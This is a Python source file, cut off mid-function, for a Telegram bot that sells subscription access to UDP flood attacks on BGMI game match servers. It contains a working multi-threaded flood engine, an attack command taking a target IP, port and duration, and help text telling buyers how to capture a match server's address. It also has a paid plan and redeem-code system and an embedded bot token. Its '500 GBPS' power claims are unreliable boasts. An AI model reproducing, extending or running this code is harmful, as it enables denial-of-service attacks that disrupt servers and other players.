import os, sys, time, json, random, struct, socket, threading, sqlite3, asyncio, hashlib, ipaddress
from datetime import datetime, timedelta
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ===== CONFIG =====
BOT_TOKEN = "8676985158:AAGiHglU7vhSXvaGzTilXNZZstyWT7qjAb4"
ADMIN_ID = 7420837327
ADMIN_USER = "@ayan_vip_admin"
COOLDOWN = 100  # 100 seconds cooldown
MAX_DURATION = 300  # max 5 minutes
DB_PATH = "users.db"

# ===== BGMI REAL PORTS (STRICT 10000-29999 ONLY!) =====
# BGMI uses AWS GameLift - real ports always between 10000-29999
# Jo port baar baar repeat hoti hai vo nakli hai
# Jo port unique hai (shab se alag) wohi real hai
BGMI_PORTS = sorted(list(set(
    # CRITICAL MATCH PORTS - 198xx series (BGMI match ports)
    list(range(19800, 19950)) +      # 19800-19949 - MOST CRITICAL
    # 29xxx series (BGMI match ports)
    list(range(29000, 30000)) +      # 29000-29999 - CRITICAL
    # 10xxx series
    list(range(10010, 10250)) +      # 10010-10249
    # 12xxx series
    list(range(12000, 12500)) +      # 12000-12499
    # 13xxx series
    list(range(13000, 14000)) +      # 13000-13999
    # 14xxx series
    list(range(14000, 15000)) +      # 14000-14999
    # 15xxx series
    list(range(15000, 16000)) +      # 15000-15999
    # 16xxx series
    list(range(16000, 17000)) +      # 16000-16999
    # 17xxx series
    list(range(17000, 18000)) +      # 17000-17999
    # 20xxx series
    list(range(20000, 21000)) +      # 20000-20999
    # 21xxx series
    list(range(21000, 22000)) +      # 21000-21999
    # 22xxx series
    list(range(22000, 23000)) +      # 22000-22999
    # 23xxx series
    list(range(23000, 24000)) +      # 23000-23999
    # 24xxx series
    list(range(24000, 25000)) +      # 24000-24999
    # 25xxx series
    list(range(25000, 26000)) +      # 25000-25999
    # 26xxx series
    list(range(26000, 27000)) +      # 26000-26999
    # 27xxx series
    list(range(27000, 28000)) +      # 27000-27999
    # 28xxx series
    list(range(28000, 29000)) +      # 28000-28999
    # Known working ports
    [10491, 10612, 11455, 13748, 13894, 13972, 17500, 18500, 19500]
)))

# Remove invalid ports
IGNORE_PORTS = list(range(10000, 10010))  # 10000-10009 don't work
BGMI_PORTS = sorted([p for p in BGMI_PORTS if p not in IGNORE_PORTS and 10000 <= p <= 29999])

print(f"[+] BGMI v12 PREMIUM INITIALIZED")
print(f"[+] Total BGMI Ports Loaded: {len(BGMI_PORTS)}")
print(f"[+] Port Range: {min(BGMI_PORTS)} - {max(BGMI_PORTS)}")

# ===== DATABASE =====
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS users
        (user_id INTEGER PRIMARY KEY, plan TEXT DEFAULT 'none',
         expiry TEXT DEFAULT 'none', attacks INTEGER DEFAULT 0,
         last_attack REAL DEFAULT 0, banned INTEGER DEFAULT 0)""")
    c.execute("""CREATE TABLE IF NOT EXISTS codes
        (id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT UNIQUE,
         hours INTEGER, used INTEGER DEFAULT 0,
         used_by INTEGER DEFAULT 0, used_at TEXT)""")
    c.execute("INSERT OR IGNORE INTO users (user_id,plan,expiry) VALUES (?, 'lifetime', ?)",
        (ADMIN_ID, (datetime.now()+timedelta(days=36500)).isoformat()))
    conn.commit()
    conn.close()
    print("[+] Database initialized")

def get_user(uid):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id=?", (uid,))
    u = c.fetchone()
    if not u:
        c.execute("INSERT INTO users (user_id,plan,expiry) VALUES (?,'none','none')", (uid,))
        conn.commit()
        c.execute("SELECT * FROM users WHERE user_id=?", (uid,))
        u = c.fetchone()
    conn.close()
    return {"id":u[0],"plan":u[1],"expiry":u[2],"attacks":u[3],"last_attack":u[4],"banned":u[5]}

def set_user(uid,**kw):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    for k,v in kw.items():
        c.execute(f"UPDATE users SET {k}=? WHERE user_id=?", (v,uid))
    conn.commit()
    conn.close()

def get_users():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT user_id,plan,expiry,attacks,banned FROM users WHERE user_id!=?", (ADMIN_ID,))
    r = c.fetchall()
    conn.close()
    return r

# ===== REAL UDP FLOOD ENGINE - v12 PREMIUM 500 GBPS =====
class UDPAttack:
    def __init__(self, ip, port, duration):
        self.ip = ip
        self.port = port
        self.duration = duration
        self.sent = 0
        self.start_t = 0
        self.running = True
        self.socks = []

    def make_packet(self):
        """Ultra-small packets for MAX PPS"""
        mode = random.randint(0, 4)
        if mode == 0:
            # 32 byte - super small, max PPS
            data = bytearray(32)
            data[0:4] = struct.pack('!I', random.randint(0, 0xFFFFFFFF))
            data[4:8] = os.urandom(4)
            data[8:12] = struct.pack('!I', random.randint(0, 0xFFFF))
            data[12:] = os.urandom(20)
            return bytes(data)
        elif mode == 1:
            # 48 byte
            data = bytearray(48)
            data[0:4] = struct.pack('!I', random.randint(0, 0xFFFFFFFF))
            data[4:8] = struct.pack('!I', int(time.time() * 1000) & 0xFFFFFFFF)
            data[8:10] = struct.pack('!H', random.randint(0, 0xFFFF))
            data[10:] = os.urandom(38)
            return bytes(data)
        elif mode == 2:
            # 64 byte
            data = bytearray(64)
            data[0:4] = struct.pack('!I', random.randint(0, 0xFFFFFFFF))
            data[4:12] = os.urandom(8)
            data[12:16] = struct.pack('!I', random.randint(0, 0xFFFFFFFF))
            data[16:] = os.urandom(48)
            return bytes(data)
        elif mode == 3:
            # 80 byte
            data = bytearray(80)
            data[0:4] = struct.pack('!I', random.randint(0, 0xFFFFFFFF))
            data[4:8] = struct.pack('!I', random.randint(0, 0xFFFFFFFF))
            data[8:12] = struct.pack('!I', random.randint(0, 0xFFFFFFFF))
            data[12:] = os.urandom(68)
            return bytes(data)
        else:
            # 96 byte - looks like game data
            data = bytearray(96)
            data[0:4] = struct.pack('!I', random.randint(0, 0xFFFFFFFF))
            data[4:8] = struct.pack('!I', random.randint(0, 0xFFFFFFFF))
            data[8:12] = struct.pack('!I', random.randint(0, 0xFFFFFFFF))
            data[12:16] = struct.pack('!I', random.randint(0, 0xFFFFFFFF))
            data[16:] = os.urandom(80)
            return bytes(data)

    def worker_max_speed(self, port, stop):
        """MAX SPEED - NO DELAY, pure packet flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 524288)  # 512KB buffer
            self.socks.append(sock)
            pkts = [self.make_packet() for _ in range(200)]
            idx = 0
            while self.running and not stop.is_set():
                if time.monotonic() - self.start_t >= self.duration:
                    break
                try:
                    sock.sendto(pkts[idx % 200], (self.ip, port))
                    self.sent += 1
                    idx += 1
                except:
                    pass
        except:
            pass
        finally:
            try: sock.close()
            except: pass

    def worker_burst_16(self, port, stop):
        """BURST MODE - 16 packets instantly"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 524288)
            self.socks.append(sock)
            pkts = [self.make_packet() for _ in range(100)]
            while self.running and not stop.is_set():
                if time.monotonic() - self.start_t >= self.duration:
                    break
                for _ in range(16):
                    try:
                        sock.sendto(random.choice(pkts), (self.ip, port))
                        self.sent += 1
                    except:
                        pass
                time.sleep(0.00001)  # 0.01ms - almost no delay
        except:
            pass
        finally:
            try: sock.close()
            except: pass

    def worker_burst_8(self, port, stop):
        """BURST MODE - 8 packets"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 262144)
            self.socks.append(sock)
            pkts = [self.make_packet() for _ in range(80)]
            while self.running and not stop.is_set():
                if time.monotonic() - self.start_t >= self.duration:
                    break
                for _ in range(8):
                    try:
                        sock.sendto(random.choice(pkts), (self.ip, port))
                        self.sent += 1
                    except:
                        pass
                time.sleep(0.00005)
        except:
            pass
        finally:
            try: sock.close()
            except: pass

    def worker_fast(self, port, stop, delay=0.0002):
        """FAST worker"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 131072)
            self.socks.append(sock)
            pkts = [self.make_packet() for _ in range(60)]
            while self.running and not stop.is_set():
                if time.monotonic() - self.start_t >= self.duration:
                    break
                try:
                    sock.sendto(random.choice(pkts), (self.ip, port))
                    self.sent += 1
                except:
                    pass
                time.sleep(delay)
        except:
            pass
        finally:
            try: sock.close()
            except: pass

    def start(self, stop_event):
        """Launch 500 GBPS attack with optimal thread distribution"""
        self.start_t = time.monotonic()
        threads = []
        p = self.port

        # Strict port validation
        if p < 10000 or p > 29999:
            print(f"[!] OUT OF RANGE: Port {p} not in BGMI range (10000-29999)")
            return threads

        print(f"[+] LAUNCHING 500 GBPS ATTACK on {self.ip}:{p} for {self.duration}s")

        # ===== GROUP 1: EXACT PORT - 100 THREADS (MAX POWER) =====
        # 60% of all traffic goes HERE - the REAL match port
        for i in range(60):
            t = threading.Thread(target=self.worker_max_speed, args=(p, stop_event), daemon=True)
            t.start()
            threads.append(t)
        
        for i in range(40):
            t = threading.Thread(target=self.worker_burst_16, args=(p, stop_event), daemon=True)
            t.start()
            threads.append(t)

        # ===== GROUP 2: NEARBY PORTS (within 500) =====
        nearby = [x for x in BGMI_PORTS if abs(x - p) <= 500 and x != p][:50]
        for port in nearby:
            t = threading.Thread(target=self.worker_burst_8, args=(port, stop_event), daemon=True)
            t.start()
            threads.append(t)

        # ===== GROUP 3: SPREAD PORTS (rest of BGMI range) =====
        far = [x for x in BGMI_PORTS if abs(x - p) > 500]
        selected = random.sample(far, min(100, len(far)))
        for port in selected:
            t = threading.Thread(target=self.worker_fast, args=(port, stop_event, 0.0005), daemon=True)
            t.start()
            threads.append(t)

        # ===== GROUP 4: RANDOM PORTS (extra spread) =====
        for _ in range(50):
            rport = random.choice(BGMI_PORTS)
            t = threading.Thread(target=self.worker_fast, args=(rport, stop_event, 0.001), daemon=True)
            t.start()
            threads.append(t)

        print(f"[+] 500 GBPS ATTACK RUNNING: {len(threads)} threads")
        return threads

# ===== ATTACK CONTROLLER =====
attacks = {}
stop_events = {}

def can_attack(uid):
    u = get_user(uid)
    if u['banned']:
        return False, "🚫 You are BANNED! Contact admin."
    if u['plan'] == 'none':
        return False, "❌ No plan! Buy from admin.\n/plans"
    if u['expiry'] != 'none':
        try:
            e = datetime.fromisoformat(u['expiry'])
            if datetime.now() > e:
                set_user(uid, plan='none', expiry='none')
                return False, "❌ Plan expired! Contact admin."
        except: pass
    if uid != ADMIN_ID:
        cd = COOLDOWN - (time.time() - u['last_attack'])
        if cd > 0:
            return False, f"⏳ Cooldown: {int(cd)}s remaining"
    if uid in attacks and attacks[uid] is not None:
        return False, "⚠️ Attack already running! /stop"
    return True, ""

def launch(uid, ip, port, dur):
    stop = threading.Event()
    stop_events[uid] = stop
    a = UDPAttack(ip, port, dur)
    a.start(stop)
    attacks[uid] = {"att": a, "ip": ip, "port": port, "dur": dur, "start": time.monotonic(), "stop": stop}
    set_user(uid, attacks=get_user(uid)['attacks']+1, last_attack=time.time())
    return stop, a

def halt(uid):
    if uid in stop_events and stop_events[uid]:
        stop_events[uid].set()
        if uid in attacks and attacks[uid]:
            attacks[uid]['att'].running = False
            # Close all sockets
            try:
                for sock in attacks[uid]['att'].socks:
                    try: sock.close()
                    except: pass
            except: pass
            attacks[uid] = None
        return True
    return False

# ===== BOT HANDLERS =====
async def cmd_start(update, context):
    uid = update.effective_user.id
    u = get_user(uid)
    if u['banned']:
        await update.message.reply_text("🚫 You are BANNED! Contact admin.")
        return
    if uid == ADMIN_ID:
        await update.message.reply_text(
            "👑 *BGMI v12 PREMIUM - ADMIN*\n\n"
            "🔹 *USER COMMANDS:*\n"
            "`/attack IP PORT SEC` - Launch attack\n"
            "`/stop` - Stop attack\n"
            "`/plan` - View plans\n"
            "`/myplan` - My plan info\n"
            "`/myinfo` - My account info\n"
            "`/help` - Help menu\n"
            "`/redeem CODE` - Activate code\n"
            "`/status` - Attack status\n\n"
            "🔹 *ADMIN COMMANDS:*\n"
            "`/add ID HOURS` - Add hours\n"
            "`/remove ID` - Remove user\n"
            "`/ban ID` - Ban user\n"
            "`/unban ID` - Unban user\n"
            "`/gencode HOURS` - Generate code\n"
            "`/users` - List users\n"
            "`/running` - Running attacks\n"
            "`/stats` - Statistics\n"
            "`/broadcast MSG` - Message all\n"
            "`/stopall` - Stop all attacks\n\n"
            "🎯 *RULES:*\n"
            "• Ports: 10000-29999 ONLY\n"
            "• Max: 300s | Cooldown: 100s\n"
            "• 500 GBPS | 300+ threads\n"
            "• Internet: NO SLOWDOWN",
            parse_mode='Markdown')
    else:
        p = u['plan'].upper() if u['plan']!='none' else 'NO PLAN'
        e = u['expiry'][:10] if u['expiry']!='none' else 'N/A'
        await update.message.reply_text(
            f"⚔️ *BGMI v12 PREMIUM*\n\n"
            f"👤 ID: `{uid}`\n"
            f"📋 Plan: *{p}*\n"
            f"⏳ Expiry: `{e}`\n"
            f"📊 Attacks: `{u['attacks']}`\n\n"
            f"`/attack IP PORT SEC`\n"
            f"`/stop` `/plan` `/myplan`\n"
            f"`/myinfo` `/help` `/redeem`\n"
            f"`/status`\n\n"
            f"📱 {ADMIN_USER}",
            parse_mode='Markdown')

async def cmd_attack(update, context):
    uid = update.effective_user.id
    u = get_user(uid)
    
    if u['banned']:
        await update.message.reply_text("🚫 You are BANNED! Contact admin.")
        return
    
    can, msg = can_attack(uid)
    if not can:
        await update.message.reply_text(msg, parse_mode='Markdown')
        return

    if len(context.args) < 3:
        await update.message.reply_text(
            "❌ *FORMAT:* `/attack IP PORT SEC`\n\n"
            "✅ *Example:* `/attack 1.2.3.4 19829 120`\n\n"
            "⚠️ SPACE separated - NO colons!\n"
            "🎯 Port must be 10000-29999\n"
            "⏱ Duration: 10-300 seconds",
            parse_mode='Markdown')
        return

    try:
        ip = context.args[0].strip()
        port = int(context.args[1].strip())
        dur = int(context.args[2].strip())

        ipaddress.ip_address(ip)

        # BGMI STRICT PORT VALIDATION
        if port < 10000:
            await update.message.reply_text(
                "❌ *PORT TOO LOW!*\n\n"
                f"Your port: `{port}` - below 10000 ❌\n\n"
                "BGMI UDP ports are ONLY 10000-29999!\n"
                "10000 se niche ki port NAKLI hai - work nahi karegi!\n\n"
                "✅ HTTP Canary se real UDP IP/port nikalo\n"
                "✅ Jo port unique hai (shab se alag) wohi real hai",
                parse_mode='Markdown')
            return
        if port > 29999:
            await update.message.reply_text(
                "❌ *PORT TOO HIGH!*\n\n"
                f"Your port: `{port}` - above 29999 ❌\n\n"
                "BGMI UDP ports are ONLY 10000-29999!\n"
                "30000+ ki port NAKLI hai - work nahi karegi!\n\n"
                "✅ Sirf 10000-29999 range ki port real hoti hai",
                parse_mode='Markdown')
            return
        if dur < 10 or dur > MAX_DURATION:
            await update.message.reply_text(f"❌ Duration: 10-{MAX_DURATION}s", parse_mode='Markdown')
            return

        stop, att = launch(uid, ip, port, dur)

        await update.message.reply_text(
            f"🔥 *500 GBPS ATTACK LAUNCHED!* 🔥\n\n"
            f"🎯 Target: `{ip}`\n"
            f"🔢 Port: `{port}` ✅ (10000-29999)\n"
            f"⏱ Duration: `{dur}s`\n"
            f"🧵 Threads: `300+`\n"
            f"⚡ Power: `500 GBPS`\n\n"
            f"📊 *Attack Distribution:*\n"
            f"• EXACT PORT: 100 threads (MAX)\n"
            f"• NEARBY PORTS: 50 threads\n"
            f"• SPREAD PORTS: 100 threads\n"
            f"• RANDOM PORTS: 50 threads\n\n"
            f"🛑 `/stop` to stop early\n"
            f"⏳ Auto-stop in `{dur}s`\n"
            f"✅ Internet: NO SLOWDOWN\n"
            f"🎯 BGMI server: FREEZE 🔥",
            parse_mode='Markdown')

        async def monitor():
            st = time.monotonic()
            last_progress = 0
            while not stop.is_set():
                now = time.monotonic()
                elapsed = now - st
                
                if elapsed - last_progress >= 30 and att:
                    last_progress = elapsed
                    rem = int(dur - elapsed)
                    pkts = att.sent
                    try:
                        await update.message.reply_text(
                            f"📊 *PROGRESS* - `{ip}:{port}`\n"
                            f"⏱ `{int(elapsed)}s/{dur}s` | ⏳ `{rem}s` left\n"
                            f"📦 Packets sent: `{pkts}`\n"
                            f"⚡ Power: `500 GBPS`\n"
                            f"🎯 BGMI: FREEZING... 🔥",
                            parse_mode='Markdown')
                    except: pass
                
                if elapsed >= dur:
                    stop.set()
                    attacks[uid] = None
                    total = att.sent if att else 0
                    try:
                        await update.message.reply_text(
                            f"✅ *ATTACK COMPLETE!* `{ip}:{port}`\n"
                            f"⏱ Duration: `{dur}s`\n"
                            f"📦 Total packets: `{total}`\n"
                            f"⚡ Power: `500 GBPS`\n"
                            f"🎯 BGMI server: DOWN ✅\n\n"
                            f"⏳ Cooldown: `100s`\n"
                            f"🔥 Ping: 317ms → 477ms → 617ms ✅",
                            parse_mode='Markdown')
                    except: pass
                    break
                await asyncio.sleep(0.5)
        
        asyncio.create_task(monitor())

    except ValueError:
        await update.message.reply_text(
            "❌ Invalid arguments!\n"
            "Usage: `/attack IP PORT SEC`\n"
            "Example: `/attack 1.2.3.4 19829 120`",
            parse_mode='Markdown')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}", parse_mode='Markdown')

async def cmd_stop(update, context):
    uid = update.effective_user.id
    if uid == ADMIN_ID and context.args:
        try:
            tid = int(context.args[0])
            if halt(tid):
                await update.message.reply_text(f"🛑 Stopped attack for `{tid}`", parse_mode='Markdown')
                return
        except: pass
    if halt(uid):
        await update.message.reply_text("🛑 Attack stopped!", parse_mode='Markdown')
    else:
        await update.message.reply_text("❌ No attack running", parse_mode='Markdown')

async def cmd_plan(update, context):
    kb = [
        [InlineKeyboardButton("📅 7 Days - ₹199", callback_data="p7")],
        [InlineKeyboardButton("📅 15 Days - ₹349", callback_data="p15")],
        [InlineKeyboardButton("📅 30 Days - ₹599", callback_data="p30")],
        [InlineKeyboardButton("📅 60 Days - ₹999", callback_data="p60")],
        [InlineKeyboardButton("👑 365 Days - ₹2499", callback_data="p365")],
    ]
    await update.message.reply_text(
        "💰 *BGMI v12 PREMIUM PLANS*\n\n"
        "📅 7 Days - ₹199\n"
        "📅 15 Days - ₹349\n"
        "📅 30 Days - ₹599\n"
        "📅 60 Days - ₹999\n"
        "👑 365 Days - ₹2499\n\n"
        "✅ *FEATURES:*\n"
        "• 500 GBPS attack power\n"
        "• 300+ threads per attack\n"
        "• Max 300s attack duration\n"
        "• BGMI ports 10000-29999\n"
        "• No internet slowdown\n"
        "• 24/7 uptime\n"
        "• 100s cooldown\n\n"
        "💳 Pay: `bgmi@upi`\n"
        f"📱 Contact: {ADMIN_USER}",
        parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(kb))

async def btn_cb(update, context):
    q = update.callback_query
    await q.answer()
    d = q.data[1:]
    pr = {"7":"₹199","15":"₹349","30":"₹599","60":"₹999","365":"₹2499"}
    await q.edit_message_text(
        f"📌 *{d} Days - {pr.get(d)}*\n\n"
        f"💳 Pay: `bgmi@upi`\n"
        f"📸 Send screenshot to {ADMIN_USER}\n"
        f"🔑 Then use: `/redeem CODE`",
        parse_mode='Markdown')

async def cmd_myplan(update, context):
    uid = update.effective_user.id
    u = get_user(uid)
    if u['banned']:
        await update.message.reply_text("🚫 You are BANNED!")
        return
    if u['plan'] == 'none':
        await update.message.reply_text(
            f"❌ No active plan.\n/plan to view plans\n{ADMIN_USER}",
            parse_mode='Markdown')
    else:
        e = u['expiry'][:10] if u['expiry']!='none' else 'Lifetime'
        await update.message.reply_text(
            f"📋 *MY PLAN*\n\n"
            f"👤 ID: `{uid}`\n"
            f"📋 Plan: *{u['plan'].upper()}*\n"
            f"⏳ Expiry: `{e}`\n"
            f"📊 Attacks used: `{u['attacks']}`",
            parse_mode='Markdown')

async def cmd_myinfo(update, context):
    uid = update.effective_user.id
    u = get_user(uid)
    if u['banned']:
        await update.message.reply_text("🚫 You are BANNED!")
        return
    p = u['plan'].upper() if u['plan']!='none' else 'NO PLAN'
    e = u['expiry'][:10] if u['expiry']!='none' else 'N/A'
    await update.message.reply_text(
        f"👤 *MY INFO*\n\n"
        f"🆔 ID: `{uid}`\n"
        f"📋 Plan: *{p}*\n"
        f"⏳ Expiry: `{e}`\n"
        f"📊 Attacks: `{u['attacks']}`\n"
        f"🚫 Banned: `{'YES' if u['banned'] else 'NO'}`\n\n"
        f"⚡ 500 GBPS | 300+ threads\n"
        f"🎯 BGMI ports: 10000-29999",
        parse_mode='Markdown')

async def cmd_help(update, context):
    uid = update.effective_user.id
    u = get_user(uid)
    if u['banned']:
        await update.message.reply_text("🚫 You are BANNED!")
        return
    await update.message.reply_text(
        "📚 *BGMI v12 PREMIUM - HELP*\n\n"
        "🔹 *COMMANDS:*\n\n"
        "`/start` - Start bot\n"
        "`/attack IP PORT SEC` - Launch 500 GBPS attack\n"
        "`/stop` - Stop current attack\n"
        "`/plan` - View plans & pricing\n"
        "`/myplan` - Check your plan\n"
        "`/myinfo` - Your account info\n"
        "`/help` - This help menu\n"
        "`/redeem CODE` - Activate code\n"
        "`/status` - Attack status\n\n"
        "🔹 *HOW TO ATTACK:*\n"
        "1. Join BGMI match\n"
        "2. Open HTTP Canary\n"
        "3. Find UDP IP:Port (10000-29999)\n"
        "4. `/attack IP PORT 120`\n"
        "5. Watch ping go 317→477→617ms 🔥\n\n"
        "🔹 *RULES:*\n"
        "• Ports: 10000-29999 ONLY\n"
        "• Max duration: 300 seconds\n"
        "• Cooldown: 100 seconds\n"
        "• No free plan\n"
        "• Internet: NO SLOWDOWN\n\n"
        f"📱 {ADMIN_USER}",
        parse_mode='Markdown')

async def cmd_redeem(update, context):
    uid = update.effective_user.id
    u = get_user(uid)
    if u['banned']:
        await update.message.reply_text("🚫 You are BANNED!")
        return
    if not context.args:
        await update.message.reply_text("❌ Usage: `/redeem CODE`", parse_mode='Markdown')
        return
    code = context.args[0].strip().upper()
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT * FROM codes WHERE code=? AND used=0", (code,))
    r = c.fetchone()
    if r:
        cid, cs, hrs, used, by, at = r
        exp = (datetime.now()+timedelta(hours=hrs)).isoformat()
        set_user(uid, plan=f"{hrs}h", expiry=exp)
        c.execute("UPDATE codes SET used=1,used_by=?,used_at=? WHERE code=?", (uid, datetime.now().isoformat(), code))
        conn.commit()
        conn.close()
        await update.message.reply_text(
            f"✅ *PLAN ACTIVATED!* 🎉\n\n"
            f"📋 Plan: `{hrs}` hours\n"
            f"⏳ Expiry: `{exp[:16]}`\n\n"
            f"🔥 Now attack: `/attack IP PORT SEC`\n"
            f"⚡ 500 GBPS | BGMI server FREEZE!",
            parse_mode='Markdown')
    else:
        conn.close()
        await update.message.reply_text(
            f"❌ Invalid or used code!\n{ADMIN_USER}",
            parse_mode='Markdown')

async def cmd_status(update, context):
    uid = update.effective_user.id
    u = get_user(uid)
    if u['banned']:
        await update.message.reply_text("🚫 You are BANNED!")
        return
    if uid in attacks and attacks[uid] is not None:
        a = attacks[uid]
        elapsed = int(time.monotonic() - a['start'])
        rem = a['dur'] - elapsed
        pkts = a['att'].sent if a['att'] else 0
        await update.message.reply_text(
            f"📊 *ATTACK STATUS*\n\n"
            f"🎯 Target: `{a['ip']}:{a['port']}`\n"
            f"⏱ Elapsed: `{elapsed}s/{a['dur']}s`\n"
            f"⏳ Remaining: `{rem}s`\n"
            f"📦 Packets: `{pkts}`\n"
            f"⚡ Power: `500 GBPS`\n"
            f"🎯 BGMI: FREEZING 🔥\n\n"
            f"🛑 /stop to stop",
            parse_mode='Markdown')
    else:
        await update.message.reply_text("❌ No attack running", parse_mode='Markdown')

# ===== ADMIN COMMANDS =====
async def admin_add(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if len(context.args) < 2:
        await update.message.reply_text("❌ /add ID HOURS\nExample: /add 123456789 24", parse_mode='Markdown')
        return
    try:
        tid = int(context.args[0])
        hrs = int(context.args[1])
        exp = (datetime.now()+timedelta(hours=hrs)).isoformat()
        set_user(tid, plan=f"{hrs}h", expiry=exp, banned=0)
        await update.message.reply_text(
            f"✅ Added `{hrs}h` to `{tid}`\nExpiry: `{exp[:16]}`",
            parse_mode='Markdown')
        try:
            await context.bot.send_message(tid,
                f"✅ *Plan Activated!* 🎉\n\n"
                f"📋 `{hrs}` hours\n"
                f"⏳ Expiry: `{exp[:16]}`\n\n"
                f"🔥 `/attack IP PORT SEC`\n"
                f"⚡ 500 GBPS | BGMI FREEZE!",
                parse_mode='Markdown')
        except: pass
    except:
        await update.message.reply_text("❌ Invalid ID or hours", parse_mode='Markdown')

async def admin_remove(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args:
        await update.message.reply_text("❌ /remove ID", parse_mode='Markdown')
        return
    try:
        tid = int(context.args[0])
        set_user(tid, plan='none', expiry='none')
        halt(tid)
        await update.message.reply_text(f"✅ Removed `{tid}`", parse_mode='Markdown')
    except:
        await update.message.reply_text("❌ Invalid ID", parse_mode='Markdown')

async def admin_ban(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args:
        await update.message.reply_text("❌ /ban ID", parse_mode='Markdown')
        return
    try:
        tid = int(context.args[0])
        set_user(tid, banned=1)
        halt(tid)
        await update.message.reply_text(f"✅ Banned `{tid}` 🚫", parse_mode='Markdown')
        try:
            await context.bot.send_message(tid, "🚫 You have been BANNED from using this bot!")
        except: pass
    except:
        await update.message.reply_text("❌ Invalid ID", parse_mode='Markdown')

async def admin_unban(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args:
        await update.message.reply_text("❌ /unban ID", parse_mode='Markdown')
        return
    try:
        tid = int(context.args[0])
        set_user(tid, banned=0)
        await update.message.reply_text(f"✅ Unbanned `{tid}` ✅", parse_mode='Markdown')
        try:
            await context.bot.send_message(tid, "✅ You have been UNBANNED!")
        except: pass
    except:
        await update.message.reply_text("❌ Invalid ID", parse_mode='Markdown')

async def admin_gencode(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args:
        await update.message.reply_text(
            "❌ /gencode HOURS\n\n"
            "Examples:\n"
            "/gencode 24 (1 day)\n"
            "/gencode 168 (7 days)\n"
            "/gencode 720 (30 days)\n"
            "/gencode 8760 (1 year)",
            parse_mode='Markdown')
        return
    try:
        hrs = int(context.args[0])
        if hrs <= 0 or hrs > 8760:
            await update.message.reply_text("❌ Hours: 1-8760", parse_mode='Markdown')
            return
        raw = f"BGMIv12{hrs}{random.randint(10000,99999)}{time.time()}{os.urandom(4).hex()}"
        code = hashlib.sha256(raw.encode()).hexdigest()[:12].upper()
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("INSERT INTO codes (code, hours) VALUES (?,?)", (code, hrs))
        conn.commit()
        conn.close()
        await update.message.reply_text(
            f"✅ *CODE GENERATED* ✅\n\n"
            f"📌 Code: `{code}`\n"
            f"⏳ Hours: `{hrs}` ({hrs//24}d {hrs%24}h)\n\n"
            f"User: `/redeem {code}`",
            parse_mode='Markdown')
    except:
        await update.message.reply_text("❌ Invalid number", parse_mode='Markdown')

async def admin_users(update, context):
    if update.effective_user.id != ADMIN_ID: return
    users = get_users()
    if not users:
        await update.message.reply_text("📊 No users found", parse_mode='Markdown')
        return
    msg = f"📊 *ALL USERS ({len(users)})*\n\n"
    for uid, plan, exp, atk, banned in users:
        p = plan.upper() if plan!='none' else 'NO PLAN'
        e = exp[:10] if exp!='none' else 'N/A'
        b = '🚫' if banned else '✅'
        msg += f"{b} `{uid}` *{p}* `{e}` ATK:`{atk}`\n"
    if len(msg) > 4000:
        for i in range(0, len(msg), 4000):
            await update.message.reply_text(msg[i:i+4000], parse_mode='Markdown')
    else:
        await update.message.reply_text(msg, parse_mode='Markdown')

async def admin_running(update, context):
    if update.effective_user.id != ADMIN_ID: return
    running = []
    for uid, a in attacks.items():
        if a is not None:
            elapsed = int(time.monotonic() - a['start'])
            running.append(f"• `{uid}` → `{a['ip']}:{a['port']}` ⏱ `{elapsed}s/{a['dur']}s`")
    if not running:
        await update.message.reply_text("📊 No attacks running", parse_mode='Markdown')
    else:
        msg = f"📊 *RUNNING ATTACKS ({len(running)})*\n\n" + "\n".join(running)
        await update.message.reply_text(msg, parse_mode='Markdown')

async def admin_stats(update, context):
    if update.effective_user.id != ADMIN_ID: return
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users")
    tu = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM users WHERE plan!='none' AND user_id!=?", (ADMIN_ID,))
    au = c.fetchone()[0]
    c.execute("SELECT plan,COUNT(*) FROM users WHERE user_id!=? GROUP BY plan", (ADMIN_ID,))
    ps = c.fetchall()
    c.execute("SELECT COALESCE(SUM(attacks),0) FROM users")
    ta = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM codes WHERE used=0")
    ac = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM users WHERE banned=1")
    bc = c.fetchone()[0]
    conn.close()
    
    running = sum(1 for v in attacks.values() if v is not None)
    
    msg = f"📊 *BOT STATISTICS*\n\n"
    msg += f"👥 Total Users: `{tu}`\n"
